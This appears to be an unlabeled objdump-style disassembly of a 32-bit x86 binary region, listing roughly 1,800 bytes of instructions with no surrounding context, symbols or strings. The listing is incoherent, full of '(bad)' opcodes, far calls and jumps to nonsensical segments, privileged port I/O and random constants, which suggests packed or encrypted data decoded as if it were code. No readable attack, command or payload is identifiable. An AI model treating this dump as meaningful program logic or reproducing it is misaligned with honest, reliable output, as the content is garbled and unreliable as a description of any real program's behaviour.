  41be84:	inc    eax
  41be85:	cmp    ah,BYTE PTR [eax]
  41be87:	aaa    
  41be88:	adc    BYTE PTR [edi+0x62],dl
  41be8b:	arpl   WORD PTR [ecx],cx
  41be8d:	push   esp
  41be8e:	scas   eax,DWORD PTR es:[edi]
  41be8f:	adc    BYTE PTR [eax+0x403cc3ed],dh
  41be95:	cmp    eax,DWORD PTR [ebx+0x4d4341bf]
  41be9b:	retf   
  41be9c:	push   ss
  41be9d:	jb     0x41bea0
  41be9f:	or     eax,0x9c4d706b
  41bea4:	pusha  
  41bea5:	jno    0x41beeb
  41bea7:	bound  ebx,QWORD PTR [eax+0x68]
  41beaa:	push   edx
  41beab:	add    eax,0x633a3d40
  41beb0:	arpl   WORD PTR [eax+0x5a],dx
  41beb3:	leave  
  41beb4:	adc    al,BYTE PTR [ecx+0x20]
  41beb7:	jge    0x41be71
  41beb9:	test   al,0xc8
  41bebb:	cwde   
  41bebc:	inc    eax
  41bebd:	pop    eax
  41bebe:	jbe    0x41be52
  41bec0:	adc    eax,0x5157810
  41bec5:	cmp    DWORD PTR [ebx-0x41],eax
  41bec8:	imul   edi,DWORD PTR [esp+ebx*4-0x37],0x40
  41becd:	pusha  
  41bece:	or     al,BYTE PTR [ecx+0x4c]
  41bed1:	add    al,BYTE PTR [esi]
  41bed3:	cmp    al,0x13
  41bed5:	mov    cl,0xb6
  41bed7:	adc    BYTE PTR ds:0x40417ccb,dl
  41bedd:	inc    ebx
  41bede:	out    dx,eax
  41bedf:	inc    eax
  41bee0:	retf   
  41bee1:	mov    esp,0x13650466
  41bee6:	dec    edx
  41bee7:	bound  edx,QWORD PTR [edi]
  41bee9:	adc    eax,0x4240cb48
  41beee:	pop    ebx
  41beef:	shl    BYTE PTR [eax*2+0x773e3843],1
  41bef6:	or     al,0x49
  41bef8:	dec    esp
  41bef9:	pop    ecx
  41befa:	cmp    eax,0x98730141
  41beff:	sub    DWORD PTR [esi-0x50],eax
  41bf02:	addr16 adc al,0x11
  41bf05:	repnz dec ebp
  41bf07:	cmp    BYTE PTR [ebp+0x1],bh
  41bf0a:	push   edx
  41bf0b:	retf   
  41bf0c:	cmp    BYTE PTR [ebx+ebp*2+0x4d],0x10
  41bf11:	(bad)  
  41bf12:	in     al,dx
  41bf13:	test   al,0x25
  41bf15:	ins    DWORD PTR es:[edi],dx
  41bf16:	call   0x490d:0x6d2163a1
  41bf1d:	adc    al,0x8
  41bf1f:	inc    edx
  41bf20:	pop    ds
  41bf21:	retf   
  41bf22:	push   ebx
  41bf23:	retf   
  41bf24:	add    ebp,edi
  41bf26:	repnz mov dh,0x5c
  41bf29:	ins    BYTE PTR es:[edi],dx
  41bf2a:	fadd   DWORD PTR [eax+0x51]
  41bf2d:	pop    ss
  41bf2e:	jbe    0x41bf0d
  41bf30:	shl    DWORD PTR [eax+esi*2],0x82
  41bf34:	add    DWORD PTR [ebx+0x5e95620b],edx
  41bf3a:	test   BYTE PTR [edx+0x42],0xf8
  41bf3e:	jg     0x41bfb0
  41bf40:	pop    esp
  41bf41:	das    
  41bf42:	fld    DWORD PTR [eax+0x0]
  41bf45:	add    esi,ebp
  41bf47:	shl    BYTE PTR [ecx],1
  41bf49:	xor    cl,BYTE PTR [bp+0x6e]
  41bf4d:	inc    ecx
  41bf4e:	inc    esi
  41bf4f:	push   esp
  41bf50:	add    esi,DWORD PTR [esi*1-0x62afd324]
  41bf57:	nop
  41bf58:	int3   
  41bf59:	dec    esp
  41bf5a:	xchg   esp,eax
  41bf5b:	cli    
  41bf5c:	add    BYTE PTR ds:0x5653fe6,ah
  41bf62:	inc    ax
  41bf64:	popf   
  41bf65:	inc    ebx
  41bf66:	cld    
  41bf67:	stos   DWORD PTR es:[edi],eax
  41bf68:	pop    esp
  41bf69:	jnp    0x41bfbc
  41bf6b:	inc    eax
  41bf6c:	jle    0x41bf9f
  41bf6e:	pop    ss
  41bf6f:	mov    ah,0x20
  41bf71:	add    al,0xc9
  41bf73:	inc    eax
  41bf74:	leave  
  41bf75:	dec    ecx
  41bf76:	daa    
  41bf77:	push   ecx
  41bf78:	mov    edx,0x85f7b402
  41bf7d:	rcl    BYTE PTR [ecx-0x13bb3cd9],cl
  41bf83:	vhaddpd xmm7,xmm7,xmm3
  41bf87:	push   ecx
  41bf88:	add    DWORD PTR [edx-0x35],edx
  41bf8b:	dec    edi
  41bf8c:	mov    ss,WORD PTR [esi]
  41bf8e:	daa    
  41bf8f:	pushf  
  41bf90:	push   esp
  41bf91:	lock dec edi
  41bf93:	dec    esp
  41bf94:	sub    BYTE PTR [ecx+esi*4+0x7f],cl
  41bf98:	test   DWORD PTR [ebp+0x7d],0xf323c05
  41bf9f:	inc    esp
  41bfa0:	dec    edi
  41bfa1:	xor    cl,dh
  41bfa3:	jnp    0x41bf28
  41bfa5:	jle    0x41bf46
  41bfa7:	gs dec eax
  41bfa9:	inc    edx
  41bfaa:	bound  eax,QWORD PTR [edi+0x14]
  41bfad:	outs   dx,DWORD PTR ds:[esi]
  41bfae:	mov    dl,0x4c
  41bfb0:	inc    esp
  41bfb1:	xchg   esp,eax
  41bfb2:	fs dec edi
  41bfb4:	or     dl,BYTE PTR [esi+0x12]
  41bfb7:	push   ecx
  41bfb8:	cmp    ch,BYTE PTR [edx-0x40]
  41bfbb:	int3   
  41bfbc:	jp     0x41c03a
  41bfbe:	js     0x41bf9d
  41bfc0:	fdivr  DWORD PTR [ecx]
  41bfc2:	inc    ebp
  41bfc3:	push   ss
  41bfc4:	adc    al,0xbe
  41bfc6:	cwde   
  41bfc7:	arpl   WORD PTR [edx+eax*2-0x58],bx
  41bfcb:	jmp    0x9543:0x8882bfdd
  41bfd2:	adc    BYTE PTR [eax+0x2784402d],ch
  41bfd8:	cmp    eax,0x5d11bc6c
  41bfdd:	inc    eax
  41bfde:	loope  0x41c018
  41bfe0:	jl     0x41c03a
  41bfe2:	inc    ecx
  41bfe3:	rol    cl,1
  41bfe5:	loopne 0x41bf78
  41bfe7:	xchg   ecx,eax
  41bfe8:	push   eax
  41bfe9:	test   al,0x8d
  41bfeb:	dec    esp
  41bfec:	pop    si
  41bfee:	shl    DWORD PTR [ebx-0x80],cl
  41bff1:	inc    ebp
  41bff2:	cld    
  41bff3:	inc    ebx
  41bff4:	les    edi,FWORD PTR [esi+0x2aab893e]
  41bffa:	push   0x96ce2145
  41bfff:	bound  edx,QWORD PTR [eax]
  41c001:	inc    ecx
  41c002:	push   0x96d8153c
  41c007:	dec    eax
  41c008:	inc    ebx
  41c009:	or     DWORD PTR [ebp-0x60],esp
  41c00c:	ret    0xe335
  41c00f:	enter  0x3e,0x47
  41c013:	inc    edx
  41c014:	(bad)
  41c019:	bound  eax,QWORD PTR [eax+0x20404925]
  41c01f:	mul    DWORD PTR ss:[eax+eax*4-0x35]
  41c024:	shl    DWORD PTR [ebp-0x10],0x83
  41c028:	inc    ebx
  41c029:	cmp    al,0x73
  41c02b:	inc    eax
  41c02c:	and    al,BYTE PTR [eax-0x32]
  41c02f:	pop    ecx
  41c030:	cmp    eax,0xc3404b63
  41c035:	dec    ebx
  41c036:	xchg   ebp,eax
  41c037:	lea    esi,[esi+0x2f]
  41c03a:	dec    ecx
  41c03b:	inc    eax
  41c03c:	mov    eax,ss
  41c03e:	push   edi
  41c03f:	xor    DWORD PTR [edi-0x3c],esi
  41c042:	lahf   
  41c043:	call   0x4edc:0x5cf704c1
  41c04a:	dec    eax
  41c04b:	ret    
  41c04c:	xchg   edi,eax
  41c04d:	inc    edx
  41c04e:	(bad)  
  41c04f:	gs push 0xe
  41c052:	adc    cl,BYTE PTR [edi+0x30]
  41c055:	xor    BYTE PTR [ebx],al
  41c057:	pop    edx
  41c058:	sub    BYTE PTR [ebp-0x2b],al
  41c05b:	pop    eax
  41c05c:	rol    DWORD PTR [ebx],0xce
  41c05f:	xor    eax,0x8646256
  41c064:	loopne 0x41c0b1
  41c066:	inc    cl
  41c068:	ins    BYTE PTR es:[edi],dx
  41c069:	js     0x41c08e
  41c06b:	jnp    0x41c02f
  41c06d:	mov    ch,0xaf
  41c06f:	push   0x6b
  41c071:	call   0x29747cd6
  41c076:	mov    ecx,0x6362ac62
  41c07b:	or     eax,0x13b9114f
  41c080:	add    eax,0xc5494abf
  41c085:	pop    ecx
  41c086:	stc    
  41c087:	clc    
  41c088:	retf   
  41c089:	push   ebp
  41c08a:	mov    BYTE PTR [edi+0x23],dl
  41c08d:	icebp  
  41c08e:	lahf   
  41c08f:	bound  esp,QWORD PTR [edi+0x3d]
  41c092:	sub    edi,DWORD PTR [eax]
  41c094:	ret    
  41c095:	pop    esi
  41c096:	das    
  41c097:	dec    esi
  41c098:	jecxz  0x41c0fe
  41c09a:	inc    eax
  41c09b:	mov    esp,0x2827b155
  41c0a0:	bound  edi,QWORD PTR [ecx+eax*2]
  41c0a3:	adc    eax,0xb59defc0
  41c0a8:	lods   al,BYTE PTR ds:[esi]
  41c0a9:	data16 (bad) 
  41c0ac:	and    ecx,DWORD PTR ds:0x6069a10a
  41c0b2:	lock inc ecx
  41c0b4:	pop    ebp
  41c0b5:	hlt    
  41c0b6:	mov    WORD PTR [eax-0x7d9dcfcf],gs
  41c0bc:	shr    DWORD PTR [ecx+0x50],0x11
  41c0c0:	mov    ah,0x6a
  41c0c2:	pop    es
  41c0c3:	ret    
  41c0c4:	popf   
  41c0c5:	inc    ecx
  41c0c6:	call   0x55bc:0x6c056041
  41c0cd:	lock cmp dl,BYTE PTR [ebx-0x1b]
  41c0d1:	lock bound edx,QWORD PTR ds:0x381a67c2
  41c0d8:	arpl   WORD PTR [edx+0x4034cbbc],dx
  41c0de:	leave  
  41c0df:	dec    ebp
  41c0e0:	inc    eax
  41c0e1:	test   al,0x15
  41c0e3:	dec    ecx
  41c0e4:	pop    ecx
  41c0e5:	pusha  
  41c0e6:	xchg   ebx,eax
  41c0e7:	retf   
  41c0e8:	inc    ecx
  41c0e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c0ea:	gs stos DWORD PTR es:[edi],eax
  41c0ec:	ror    BYTE PTR [eax+0x6b],0x10
  41c0f0:	xchg   BYTE PTR [edx],ch
  41c0f2:	mov    esi,0xa0332348
  41c0f7:	lods   al,BYTE PTR ds:[esi]
  41c0f8:	mov    al,0xdf
  41c0fa:	bound  ecx,QWORD PTR [ebp+0x79]
  41c0fd:	popa   
  41c0fe:	mov    esi,0x38354141
  41c103:	xor    cl,al
  41c105:	mov    bl,0x94
  41c107:	fs jno 0x41c08a
  41c10a:	stc    
  41c10b:	mov    esp,0x245be35e
  41c110:	xor    al,0xc5
  41c112:	dec    ecx
  41c113:	add    eax,0x443642c1
  41c118:	arpl   WORD PTR [ecx-0x7e],ax
  41c11b:	xchg   DWORD PTR [ecx+esi*8+0x2e],eax
  41c11f:	sub    bl,BYTE PTR [ebp-0x3e4bd482]
  41c125:	push   ebp
  41c126:	sub    esp,DWORD PTR [esi-0x78]
  41c129:	nop
  41c12a:	inc    edx
  41c12b:	or     eax,0x8e461d52
  41c130:	js     0x41c194
  41c132:	inc    eax
  41c133:	leave  
  41c134:	ret    
  41c135:	out    0xa7,al
  41c137:	(bad)  
  41c139:	clc    
  41c13a:	or     al,0x64
  41c13c:	out    dx,eax
  41c13d:	push   ss
  41c13e:	pop    ecx
  41c13f:	jle    0x41c0e9
  41c141:	dec    ecx
  41c142:	push   0x8
  41c144:	jb     0x41c175
  41c146:	sub    al,0xa4
  41c148:	adc    BYTE PTR ds:0x36c1451a,ch
  41c14e:	jbe    0x41c1b2
  41c150:	fistp  DWORD PTR [esi]
  41c152:	cmp    al,0x44
  41c154:	push   0xb82f313c
  41c159:	arpl   WORD PTR [ebx+0x30],sp
  41c15c:	ret    0xc068
  41c15f:	xor    BYTE PTR ds:0x35b84329,cl
  41c165:	inc    ebx
  41c166:	and    eax,0xa22c43b8
  41c16b:	pop    eax
  41c16c:	jae    0x41c0ff
  41c16e:	daa    
  41c16f:	add    eax,0x21816260
  41c174:	ret    0x8b03
  41c177:	xchg   ebx,eax
  41c179:	mov    eax,0xf133c940
  41c17e:	mov    bh,0x17
  41c180:	bound  edi,QWORD PTR [ecx+0x41]
  41c183:	pop    esp
  41c184:	stos   DWORD PTR es:[di],eax
  41c186:	and    ch,BYTE PTR [edi]
  41c188:	mov    al,0xb1
  41c18a:	ins    BYTE PTR es:[edi],dx
  41c18b:	adc    edx,eax
  41c18d:	addr16 pop ss
  41c18f:	bound  eax,QWORD PTR ds:0x443e062
  41c195:	push   eax
  41c196:	sbb    eax,0x62b8cb05
  41c19b:	dec    eax
  41c19c:	dec    edx
  41c19d:	xor    eax,0xd71cd29
  41c1a2:	push   ecx
  41c1a3:	inc    edx
  41c1a4:	shl    BYTE PTR [ebp+0x46],0x98
  41c1a8:	xor    al,0x45
  41c1aa:	inc    esp
  41c1ab:	inc    ecx
  41c1ac:	xchg   ebp,eax
  41c1ad:	xchg   ecx,eax
  41c1ae:	or     BYTE PTR [edx+0x42],0x3e
  41c1b2:	add    eax,0xbe5b6e38
  41c1b7:	rcr    DWORD PTR fs:[esi-0x4e],cl
  41c1bb:	retf   
  41c1bc:	shl    BYTE PTR [edi-0x5463b7a2],1
  41c1c2:	bound  esp,QWORD PTR [eax-0x3bbeef3e]
  41c1c8:	arpl   WORD PTR [eax+0x352105cb],si
  41c1ce:	mov    dl,0x52
  41c1d0:	fcom   DWORD PTR ds:0x600c9be
  41c1d6:	sub    BYTE PTR [eax+0x60e5c9e6],ch
  41c1dc:	ret    0xc773
  41c1df:	lahf   
  41c1e0:	icebp  
  41c1e1:	add    al,0x63
  41c1e3:	add    dh,BYTE PTR [ebx]
  41c1e5:	jecxz  0x41c22f
  41c1e7:	sub    al,BYTE PTR [edx+0x8434711]
  41c1ed:	xchg   ecx,eax
  41c1ee:	jecxz  0x41c25f
  41c1f0:	cs inc esp
  41c1f2:	push   es
  41c1f3:	dec    eax
  41c1f4:	rol    DWORD PTR [ebp-0x6e],0x68
  41c1f8:	retf   
  41c1f9:	xor    ebx,DWORD PTR [ecx-0x4f68b9fb]
  41c1ff:	bound  esi,QWORD PTR [eax-0x3b349ac0]
  41c205:	dec    DWORD PTR [edi+0x27]
  41c208:	or     eax,0x2eb84062
  41c20d:	inc    ebp
  41c20e:	shr    DWORD PTR [ebx+0x15404bc9],cl
  41c214:	push   ss
  41c215:	lahf   
  41c216:	add    al,0xbc
  41c218:	mov    eax,0x52cb4035
  41c21d:	push   edx
  41c21e:	cmp    eax,0xd7100dff
  41c223:	mov    eax,0xcb479ec0
  41c228:	imul   eax,DWORD PTR [edx],0x41
  41c22b:	or     eax,0x62de4527
  41c230:	dec    esp
  41c231:	jnp    0x41c29f
  41c233:	leave  
  41c234:	inc    edx
  41c235:	mov    edi,0x4c0d91f1
  41c23a:	add    BYTE PTR [eax],bh
  41c23c:	shr    BYTE PTR [ecx+0x4a],0x20
  41c240:	retf   
  41c241:	add    eax,0x50305063
  41c246:	inc    eax
  41c247:	inc    esi
  41c248:	cmove  ecx,DWORD PTR [edi+0xc]
  41c24c:	inc    esi
  41c24d:	mov    bl,0xee
  41c24f:	dec    edi
  41c250:	xor    al,0x22
  41c252:	and    BYTE PTR [ebx-0x3f],al
  41c255:	mov    esp,DWORD PTR [edi-0x5b]
  41c258:	dec    esp
  41c259:	jo     0x41c232
  41c25b:	dec    eax
  41c25c:	jbe    0x41c297
  41c25e:	shl    DWORD PTR [edi+0x4a],cl
  41c261:	(bad)  
  41c262:	lds    ecx,FWORD PTR ds:0xe44982c4
  41c268:	jge    0x41c2b5
  41c26a:	ror    bl,1
  41c26c:	das    
  41c26d:	mov    al,0xbf
  41c26f:	gs xchg esp,eax
  41c271:	xor    al,0xda
  41c273:	test   al,0x4b
  41c275:	pusha  
  41c276:	fst    QWORD PTR [ebx+eiz*2-0x41]
  41c27a:	xor    BYTE PTR ds:0x8fa4aec1,al
  41c280:	pop    ss
  41c281:	dec    esp
  41c282:	xor    al,0xcb
  41c284:	in     eax,dx
  41c285:	inc    esp
  41c286:	dec    esi
  41c287:	fnsave [edi*1+0x3fc54063]
  41c28e:	(bad)  
  41c28f:	push   eax
  41c290:	mov    edi,0xc19137c3
  41c295:	inc    esp
  41c296:	dec    ebx
  41c297:	xor    BYTE PTR [eax+0x722bdc5c],bh
  41c29d:	aas    
  41c29e:	cmp    cl,BYTE PTR [ebp+0x3d]
  41c2a1:	inc    esp
  41c2a2:	cmc    
  41c2a3:	inc    eax
  41c2a4:	ret    
  41c2a5:	jbe    0x41c2d1
  41c2a7:	lods   al,BYTE PTR ds:[esi]
  41c2a8:	ret    
  41c2a9:	gs test eax,0x1adf4b40
  41c2af:	xchg   edx,eax
  41c2b0:	xchg   esi,eax
  41c2b1:	pushf  
  41c2b2:	mov    eax,0xe84cc040
  41c2b7:	mov    edi,0x483762ab
  41c2bc:	xor    al,0x9f
  41c2be:	dec    ebp
  41c2bf:	je     0x41c303
  41c2c1:	dec    eax
  41c2c2:	mov    edi,0x2d7719f9
  41c2c7:	ret    0xbaab
  41c2ca:	pop    ds
  41c2cb:	inc    eax
  41c2cc:	shl    ebp,0x2a
  41c2cf:	bound  edi,QWORD PTR [eax+0x4f409025]
  41c2d5:	jg     0x41c355
  41c2d7:	ror    BYTE PTR [eax-0x71],1
  41c2da:	dec    esp
  41c2db:	inc    ecx
  41c2dc:	ret    
  41c2dd:	not    ah
  41c2df:	retf   
  41c2e0:	adc    BYTE PTR [ebp+0x7f3e74c3],bl
  41c2e6:	and    al,0xbf
  41c2e8:	or     al,0xa8
  41c2ea:	ffree  st(4)
  41c2ec:	ret    0x7bff
  41c2ef:	mov    esi,0x4f621167
  41c2f4:	pusha  
  41c2f5:	sbb    esp,eax
  41c2f7:	mov    dh,0x35
  41c2f9:	jl     0x41c327
  41c2fb:	inc    eax
  41c2fc:	scas   al,BYTE PTR es:[edi]
  41c2fd:	mov    esi,0x81c14a3
  41c302:	jnp    0x41c2ac
  41c304:	pop    ebp
  41c305:	arpl   WORD PTR [ebx],sp
  41c307:	inc    ebx
  41c308:	push   es
  41c309:	inc    ebx
  41c30a:	lods   al,BYTE PTR ds:[esi]
  41c30b:	cmp    eax,0x1e4b13c0
  41c310:	push   ds
  41c311:	lea    ebp,[edi-0x3d]
  41c314:	sub    eax,0x6978526d
  41c319:	sub    BYTE PTR ds:0x335468a8,al
  41c31f:	bound  ebx,QWORD PTR [ebx+0x10]
  41c322:	xchg   DWORD PTR ds:0x409c14c0,eax
  41c328:	add    al,0xb8
  41c32a:	fs leave 
  41c32c:	sub    DWORD PTR [ecx+0x56],esi
  41c32f:	fadd   st(1),st
  41c331:	xchg   ecx,eax
  41c332:	add    al,BYTE PTR [ecx+ecx*2-0x6f]
  41c336:	ret    
  41c337:	jle    0x41c39c
  41c339:	or     cl,0x84
  41c33c:	rol    BYTE PTR [ecx+0x44],0x38
  41c340:	outs   dx,BYTE PTR ds:[esi]
  41c341:	imul   eax,DWORD PTR [edx-0x3d],0x27
  41c345:	jno    0x41c2e2
  41c347:	bound  esp,QWORD PTR [eax-0x27]
  41c34a:	dec    ecx
  41c34b:	inc    eax
  41c34c:	pusha  
  41c34d:	inc    esi
  41c34e:	inc    ax
  41c350:	bound  edi,QWORD PTR [eax-0x3c]
  41c353:	inc    eax
  41c354:	shl    eax,0x55
  41c357:	sub    al,0xaa
  41c359:	add    al,BYTE PTR [edx-0x3e]
  41c35c:	push   ecx
  41c35d:	push   cs
  41c35e:	fucom  st(0)
  41c360:	jp     0x41c359
  41c362:	loopne 0x41c38a
  41c364:	les    esp,FWORD PTR [edi]
  41c366:	xchg   edx,eax
  41c367:	cmp    al,0x7d
  41c369:	dec    edi
  41c36a:	pop    es
  41c36b:	test   al,0xeb
  41c36d:	xor    DWORD PTR [edi],esi
  41c36f:	popa   
  41c370:	push   0x47
  41c372:	ret    
  41c373:	adc    BYTE PTR [esi],dh
  41c375:	popf   
  41c376:	out    dx,eax
  41c377:	stos   DWORD PTR es:[edi],eax
  41c378:	add    eax,0x5948a827
  41c37d:	imul   ebp,DWORD PTR [edx+0x60bc5c80],0x5
  41c384:	shl    DWORD PTR [ecx],0x95
  41c387:	jae    0x41c3ee
  41c389:	fs add ebx,ecx
  41c38c:	outs   dx,BYTE PTR ds:[esi]
  41c38d:	push   ebp
  41c38e:	pop    es
  41c38f:	inc    esp
  41c390:	dec    esp
  41c391:	xor    eax,0x10c040c9
  41c396:	jns    0x41c3da
  41c398:	add    eax,0x23404388
  41c39d:	adc    al,0x34
  41c39f:	add    ecx,ecx
  41c3a1:	push   edx
  41c3a2:	dec    edx
  41c3a3:	inc    ecx
  41c3a4:	inc    ecx
  41c3a5:	inc    esi
  41c3a6:	icebp  
  41c3a7:	push   eax
  41c3a8:	dec    ecx
  41c3a9:	add    eax,0x32c010cc
  41c3ae:	xchg   edx,eax
  41c3af:	push   0xa91063ff
  41c3b4:	es adc dl,bl
  41c3b7:	mov    esp,0xac8c3d40
  41c3bc:	inc    esi
  41c3bd:	inc    eax
  41c3be:	inc    ebx
  41c3bf:	cmp    al,0xa8
  41c3c1:	bound  esp,QWORD PTR [edx+0x5]
  41c3c4:	ror    BYTE PTR ds:0x330a64f6,0x40
  41c3cb:	retf   
  41c3cc:	and    ebp,DWORD PTR [ecx-0x5e]
  41c3cf:	jb     0x41c407
  41c3d1:	fs inc eax
  41c3d3:	dec    eax
  41c3d4:	sub    dl,bh
  41c3d6:	dec    esp
  41c3d7:	sub    BYTE PTR [edi+0x69],cl
  41c3da:	out    dx,al
  41c3db:	xor    eax,0x41da9165
  41c3e0:	xor    eax,0x4040a466
  41c3e5:	(bad)  
  41c3e8:	inc    eax
  41c3e9:	inc    esp
  41c3ea:	test   al,0x4c
  41c3ec:	xor    BYTE PTR ds:0x214c45f3,dh
  41c3f2:	pop    esp
  41c3f3:	cmp    eax,0x87f64bef
  41c3f8:	inc    ecx
  41c3f9:	inc    ebp
  41c3fa:	add    al,bl
  41c3fc:	inc    edx
  41c3fd:	adc    DWORD PTR [ebp-0x369deabc],ebp
  41c403:	inc    esi
  41c404:	mov    ecx,0x344bf81c
  41c409:	or     eax,DWORD PTR [ebp+0x34]
  41c40c:	inc    ebp
  41c40d:	xchg   edi,eax
  41c40e:	ret    
  41c40f:	shl    DWORD PTR [ebx-0x72],cl
  41c412:	inc    esp
  41c413:	inc    eax
  41c414:	inc    eax
  41c415:	sub    BYTE PTR [eax+0x3f],ah
  41c418:	out    dx,al
  41c419:	test   al,0xfc
  41c41b:	dec    eax
  41c41c:	xor    BYTE PTR [ebx],dl
  41c41e:	sub    BYTE PTR [eax+0x3d4045a9],0x55
  41c425:	add    al,0xfa
  41c427:	adc    BYTE PTR [edx+ebp*1+0x5740c340],ch
  41c42e:	sub    al,0x4c
  41c430:	inc    BYTE PTR [edx-0x13]
  41c433:	jge    0x41c45e
  41c435:	jl     0x41c424
  41c437:	cmp    ecx,edi
  41c439:	loope  0x41c3ed
  41c43b:	inc    eax
  41c43c:	jmp    0xa8a0:0x50e1f77f
  41c443:	add    al,0x31
  41c445:	pop    ebp
  41c446:	std    
  41c447:	inc    eax
  41c448:	jno    0x41c4ac
  41c44a:	ja     0x41c474
  41c44c:	inc    edx
  41c44d:	std    
  41c44e:	sbb    al,0x40
  41c450:	mov    ebp,0x29ac43a9
  41c455:	jge    0x41c4d2
  41c457:	inc    eax
  41c458:	fs mov al,0x5e
  41c45b:	add    eax,0x416e5121
  41c460:	clc    
  41c461:	lods   eax,DWORD PTR ds:[esi]
  41c462:	and    al,0x87
  41c464:	inc    eax
  41c465:	mov    edi,0x3e6541f4
  41c46a:	inc    esp
  41c46b:	jo     0x41c4a2
  41c46d:	inc    ebp
  41c46e:	dec    ebp
  41c46f:	rcl    BYTE PTR [ebp+ecx*2+0x3c],0x41
  41c474:	inc    eax
  41c475:	jo     0x41c438
  41c477:	inc    ebp
  41c478:	inc    ecx
  41c479:	cmp    al,0x3a
  41c47b:	dec    edi
  41c47c:	xor    dh,BYTE PTR [ecx+ebx*1-0x79]
  41c480:	std    
  41c481:	pop    ecx
  41c482:	(bad)  
  41c483:	(bad)  
  41c485:	repz bound eax,QWORD PTR fs:[edi-0x78]
  41c48a:	add    eax,0x7d134240
  41c48f:	xor    al,0x60
  41c491:	push   eax
  41c492:	fimul  WORD PTR [ecx+ebp*1+0x10405767]
  41c499:	dec    ebp
  41c49a:	arpl   WORD PTR [edx+eiz*8+0x41428733],cx
  41c4a1:	fst    QWORD PTR [eax]
  41c4a3:	mov    WORD PTR [ebx+0x64],cs
  41c4a6:	xchg   edi,eax
  41c4a7:	inc    ebp
  41c4a8:	std    
  41c4a9:	jo     0x41c4f7
  41c4ab:	mov    WORD PTR [eax-0x61],es
  41c4ae:	call   0x47c239df
  41c4b3:	mov    WORD PTR ds:0xe87df454,fs
  41c4b9:	jno    0x41c441
  41c4bb:	mov    WORD PTR [ecx+0x31],cs
  41c4be:	lock ret 
  41c4c0:	inc    ecx
  41c4c1:	mov    WORD PTR [edx],ss
  41c4c3:	mov    WORD PTR [edx+0x5d],es
  41c4c6:	nop
  41c4c7:	push   ds
  41c4c8:	std    
  41c4c9:	cld    
  41c4ca:	push   eax
  41c4cb:	mov    WORD PTR [esi],?
  41c4cd:	xor    eax,ebx
  41c4cf:	dec    BYTE PTR [esi+0x68]
  41c4d2:	add    BYTE PTR [ebx+0x626247d7],0x60
  41c4d9:	mov    ah,0xc3
  41c4db:	sbb    eax,0x4d693140
  41c4e0:	lods   al,BYTE PTR ds:[esi]
  41c4e1:	push   ebp
  41c4e2:	inc    ecx
  41c4e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c4e4:	pusha  
  41c4e5:	call   FWORD PTR [ecx+0x43a5c398]
  41c4eb:	retf   
  41c4ec:	imul   ecx,DWORD PTR [edx-0x77],0x43
  41c4f0:	addr16 push edx
  41c4f2:	sub    BYTE PTR [eax-0x37272ebe],al
  41c4f8:	jle    0x41c53f
  41c4fa:	push   ebp
  41c4fb:	jae    0x41c50d
  41c4fd:	pop    ebp
  41c4fe:	push   ds
  41c4ff:	xchg   ebp,eax
  41c500:	arpl   WORD PTR [ecx-0x35],dx
  41c503:	sub    dl,0xdf
  41c506:	sahf   
  41c507:	mov    esp,0xab5467c7
  41c50c:	fucom  st(4)
  41c50e:	mov    ecx,0x1add463
  41c513:	mov    esp,0xd94e334c
  41c518:	pop    ebx
  41c519:	test   al,0xc9
  41c51b:	or     eax,0x948e4562
  41c520:	pusha  
  41c521:	adc    al,BYTE PTR [edx-0x37]
  41c524:	arpl   cx,dx
  41c526:	and    DWORD PTR [ecx+0x48424871],ecx
  41c52c:	inc    ebp
  41c52d:	and    ah,BYTE PTR [eax+ebx*8-0x341bbeb0]
  41c534:	gs mov dl,0xdf
  41c537:	addr16 adc eax,0x40bc4214
  41c53d:	adc    al,0xf9
  41c53f:	inc    edx
  41c540:	retf   
  41c541:	cmp    ah,dl
  41c543:	add    eax,0xc0266128
  41c548:	ins    BYTE PTR es:[edi],dx
  41c549:	bound  edi,QWORD PTR [eax]
  41c54b:	retf   
  41c54c:	ins    DWORD PTR es:[edi],dx
  41c54d:	icebp  
  41c54e:	xchg   esp,eax
  41c54f:	loope  0x41c518
  41c551:	push   0x78404c56
  41c556:	dec    ecx
  41c557:	adc    BYTE PTR [eax+eiz*8+0x5324aba8],ch
  41c55e:	pusha  
  41c55f:	jmp    0x58543914
  41c564:	arpl   WORD PTR [ebx-0x6f8104d1],di
  41c56a:	pop    eax
  41c56b:	add    al,BYTE PTR [eax+0x45]
  41c56e:	lds    ebp,FWORD PTR [eax-0x34ee9a32]
  41c574:	cmc    
  41c575:	fdiv   st,st(3)
  41c577:	add    al,0x63
  41c579:	adc    bl,cl
  41c57b:	mov    eax,0x12173a37
  41c580:	arpl   WORD PTR [esp+eax*2+0x28406315],ax
  41c587:	bound  ebp,QWORD PTR [eax+edi*2+0x2940cb44]
  41c58e:	cmc    
  41c58f:	inc    eax
  41c590:	pusha  
  41c591:	cmp    BYTE PTR ss:[eax+0x32],cl
  41c595:	inc    ebp
  41c596:	add    dh,BYTE PTR gs:[esp+eax*2]
  41c59a:	dec    ebp
  41c59b:	xor    eax,0x50893157
  41c5a0:	add    BYTE PTR [ebx+ecx*8],0x48
  41c5a4:	inc    eax
  41c5a5:	inc    esp
  41c5a6:	dec    esp
  41c5a7:	or     ch,al
  41c5a9:	push   ebx
  41c5aa:	xor    eax,0x60f12405
  41c5af:	jecxz  0x41c5f2
  41c5b1:	push   edx
  41c5b2:	xor    al,0x7b
  41c5b4:	jns    0x41c5c1
  41c5b6:	(bad)  
  41c5b7:	push   eax
  41c5b8:	mov    WORD PTR [esi-0x80],fs
  41c5bb:	dec    eax
  41c5bc:	inc    edx
  41c5bd:	mov    bl,0xfe
  41c5bf:	inc    ebx
  41c5c0:	loopne 0x41c5fe
  41c5c2:	lds    eax,FWORD PTR [edx+eiz*1+0x18b84b5b]
  41c5c9:	arpl   WORD PTR [ebx-0x3d],ax
  41c5cc:	pop    edi
  41c5cd:	xchg   ebp,eax
  41c5ce:	push   eax
  41c5cf:	sbb    BYTE PTR [edx+0x4240446d],0xcf
  41c5d6:	push   eax
  41c5d7:	arpl   cx,ax
  41c5d9:	cld    
  41c5da:	fadd   QWORD PTR [eax+0x15]
  41c5dd:	outs   dx,DWORD PTR ds:[esi]
  41c5de:	addr16 cld 
  41c5e0:	adc    BYTE PTR [eax+ebx*8+0x18],ah
  41c5e4:	cmp    BYTE PTR [ebx],dl
  41c5e6:	inc    edx
  41c5e7:	test   al,0xf8
  41c5e9:	push   ebp
  41c5ea:	fdivr  QWORD PTR [esi+0x42017e40]
  41c5f0:	(bad)  
